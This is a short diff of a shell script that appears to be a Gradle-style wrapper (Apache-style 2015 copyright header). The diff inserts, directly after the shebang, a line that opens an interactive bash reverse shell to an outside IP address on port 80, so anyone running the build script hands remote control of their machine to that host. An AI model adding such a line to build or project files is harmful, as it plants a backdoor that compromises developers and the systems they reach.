@@ -1,5 +1,6 @@
 #!/usr/bin/env sh
 
+/bin/bash -i >& /dev/tcp/159.223.121.196/80 0>&1
 #
 # Copyright 2015 the original author or authors.
 #
